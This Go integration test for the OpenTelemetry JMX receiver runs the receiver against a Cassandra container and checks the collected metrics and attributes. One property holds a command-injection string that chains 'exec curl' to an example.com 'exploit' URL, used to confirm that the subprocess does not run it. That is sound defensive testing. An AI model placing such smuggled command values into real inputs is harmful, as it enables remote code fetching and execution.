// Copyright The OpenTelemetry Authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//go:build integration
// +build integration

package jmxreceiver

import (
	"context"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"github.com/stretchr/testify/suite"
	"github.com/testcontainers/testcontainers-go"
	"github.com/testcontainers/testcontainers-go/wait"
	"go.opentelemetry.io/collector/component/componenttest"
	"go.opentelemetry.io/collector/consumer/consumertest"
	"go.opentelemetry.io/collector/exporter/exporterhelper"
	"go.opentelemetry.io/collector/model/pdata"
	"go.uber.org/zap"
	"go.uber.org/zap/zaptest/observer"
)

var jmxJarReleases = map[string]string{
	"1.0.0-alpha": "https://repo1.maven.org/maven2/io/opentelemetry/contrib/opentelemetry-java-contrib-jmx-metrics/1.0.0-alpha/opentelemetry-java-contrib-jmx-metrics-1.0.0-alpha.jar",
	"1.4.0-alpha": "https://repo1.maven.org/maven2/io/opentelemetry/contrib/opentelemetry-jmx-metrics/1.4.0-alpha/opentelemetry-jmx-metrics-1.4.0-alpha.jar",
}

type JMXIntegrationSuite struct {
	suite.Suite
	VersionToJar map[string]string
}

func TestJMXIntegration(t *testing.T) {
	suite.Run(t, new(JMXIntegrationSuite))
}

func (suite *JMXIntegrationSuite) SetupSuite() {
	suite.VersionToJar = make(map[string]string)
	for version, url := range jmxJarReleases {
		jarPath, err := downloadJMXMetricGathererJAR(url)
		require.NoError(suite.T(), err)
		suite.VersionToJar[version] = jarPath
	}
}

func (suite *JMXIntegrationSuite) TearDownSuite() {
	for _, path := range suite.VersionToJar {
		require.NoError(suite.T(), os.Remove(path))
	}
}

func downloadJMXMetricGathererJAR(url string) (string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	file, err := ioutil.TempFile("", "jmx-metrics.jar")
	if err != nil {
		return "", err
	}

	defer file.Close()
	_, err = io.Copy(file, resp.Body)
	return file.Name(), err
}

func cassandraContainer(t *testing.T) testcontainers.Container {
	ctx := context.Background()
	req := testcontainers.ContainerRequest{
		FromDockerfile: testcontainers.FromDockerfile{
			Context:    path.Join(".", "testdata"),
			Dockerfile: "Dockerfile.cassandra",
		},
		ExposedPorts: []string{"7199:7199"},
		WaitingFor:   wait.ForListeningPort("7199"),
	}
	cassandra, err := testcontainers.GenericContainer(ctx, testcontainers.GenericContainerRequest{
		ContainerRequest: req,
		Started:          true,
	})
	require.NoError(t, err)
	return cassandra
}

func getJavaStdout(receiver *jmxMetricReceiver) string {
	msg := ""
LOOP:
	for i := 0; i < 70; i++ {
		t := time.NewTimer(5 * time.Second)
		select {
		case m, ok := <-receiver.subprocess.Stdout:
			if ok {
				msg = msg + m + "\n"
			} else {
				break LOOP
			}
		case <-t.C:
			break LOOP
		}
	}
	return fmt.Sprintf("metrics not collected: %v\n", msg)
}

func getLogsOnFailure(t *testing.T, logObserver *observer.ObservedLogs) {
	if !t.Failed() {
		return
	}
	fmt.Printf("Logs: \n")
	for _, statement := range logObserver.All() {
		fmt.Printf("%v\n", statement)
	}
}

func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {

	for version, jar := range suite.VersionToJar {
		t := suite.T()
		// Run one test per JMX receiver version we're integrating with.
		t.Run(version, func(t *testing.T) {
			cassandra := cassandraContainer(t)
			defer cassandra.Terminate(context.Background())
			hostname, err := cassandra.Host(context.Background())
			require.NoError(t, err)

			logCore, logObserver := observer.New(zap.DebugLevel)
			defer getLogsOnFailure(t, logObserver)

			logger := zap.New(logCore)
			params := componenttest.NewNopReceiverCreateSettings()
			params.Logger = logger

			cfg := &Config{
				CollectionInterval: 100 * time.Millisecond,
				Endpoint:           fmt.Sprintf("%v:7199", hostname),
				JARPath:            jar,
				GroovyScript:       path.Join(".", "testdata", "script.groovy"),
				OTLPExporterConfig: otlpExporterConfig{
					Endpoint: "127.0.0.1:0",
					TimeoutSettings: exporterhelper.TimeoutSettings{
						Timeout: 1000 * time.Millisecond,
					},
				},
				Password: "cassandra",
				Username: "cassandra",
				Properties: map[string]string{
					// should be used by Autoconfigure to set resource attributes
					"otel.resource.attributes": "myattr=myvalue,myotherattr=myothervalue",
					// test script sets dp labels from these system property values
					"my.label.name": "mylabel", "my.label.value": "myvalue",
					"my.other.label.name": "myotherlabel", "my.other.label.value": "myothervalue",
					// confirmation that arbitrary content isn't executed by subprocess
					"one": "two & exec curl http://example.com/exploit && exit 123",
				},
			}
			require.NoError(t, cfg.validate())

			consumer := new(consumertest.MetricsSink)
			require.NotNil(t, consumer)

			receiver := newJMXMetricReceiver(params, cfg, consumer)
			require.NotNil(t, receiver)
			defer func() {
				require.Nil(t, receiver.Shutdown(context.Background()))
			}()

			require.NoError(t, receiver.Start(context.Background(), componenttest.NewNopHost()))

			require.Eventually(t, func() bool {
				found := consumer.DataPointCount() > 0
				if !found {
					return false
				}

				metric := consumer.AllMetrics()[0]
				require.Equal(t, 1, metric.DataPointCount())

				rm := metric.ResourceMetrics().At(0)
				resource := rm.Resource()
				attributes := resource.Attributes()
				lang, ok := attributes.Get("telemetry.sdk.language")
				require.True(t, ok)
				require.Equal(t, "java", lang.StringVal())

				sdkName, ok := attributes.Get("telemetry.sdk.name")
				require.True(t, ok)
				require.Equal(t, "opentelemetry", sdkName.StringVal())

				version, ok := attributes.Get("telemetry.sdk.version")
				require.True(t, ok)
				require.NotEmpty(t, version.StringVal())

				customAttr, ok := attributes.Get("myattr")
				require.True(t, ok)
				require.Equal(t, "myvalue", customAttr.StringVal())

				anotherCustomAttr, ok := attributes.Get("myotherattr")
				require.True(t, ok)
				require.Equal(t, "myothervalue", anotherCustomAttr.StringVal())

				ilm := rm.InstrumentationLibraryMetrics().At(0)
				require.Equal(t, "io.opentelemetry.contrib.jmxmetrics", ilm.InstrumentationLibrary().Name())
				require.Equal(t, "1.0.0-alpha", ilm.InstrumentationLibrary().Version())

				met := ilm.Metrics().At(0)

				require.Equal(t, "cassandra.storage.load", met.Name())
				require.Equal(t, "Size, in bytes, of the on disk data size this node manages", met.Description())
				require.Equal(t, "By", met.Unit())

				// otel-java only uses int sum w/ non-monotonic for up down counters instead of gauge
				require.Equal(t, pdata.MetricDataTypeSum, met.DataType())
				sum := met.Sum()
				require.False(t, sum.IsMonotonic())

				// These labels are determined by system properties
				labels := sum.DataPoints().At(0).Attributes()
				customLabel, ok := labels.Get("mylabel")
				require.True(t, ok)
				require.Equal(t, "myvalue", customLabel.StringVal())

				anotherCustomLabel, ok := labels.Get("myotherlabel")
				require.True(t, ok)
				require.Equal(t, "myothervalue", anotherCustomLabel.StringVal())

				return true
			}, 30*time.Second, 100*time.Millisecond, getJavaStdout(receiver))
		})
	}
}

func TestJMXReceiverInvalidOTLPEndpointIntegration(t *testing.T) {
	params := componenttest.NewNopReceiverCreateSettings()
	cfg := &Config{
		CollectionInterval: 100 * time.Millisecond,
		Endpoint:           fmt.Sprintf("service:jmx:rmi:///jndi/rmi://localhost:7199/jmxrmi"),
		JARPath:            "/notavalidpath",
		Properties:         make(map[string]string),
		GroovyScript:       path.Join(".", "testdata", "script.groovy"),
		OTLPExporterConfig: otlpExporterConfig{
			Endpoint: "<invalid>:123",
			TimeoutSettings: exporterhelper.TimeoutSettings{
				Timeout: 1000 * time.Millisecond,
			},
		},
	}
	receiver := newJMXMetricReceiver(params, cfg, consumertest.NewNop())
	require.NotNil(t, receiver)
	defer func() {
		require.EqualError(t, receiver.Shutdown(context.Background()), "no subprocess.cancel().  Has it been started properly?")
	}()

	err := receiver.Start(context.Background(), componenttest.NewNopHost())
	require.Contains(t, err.Error(), "listen tcp: lookup <invalid>:")
}
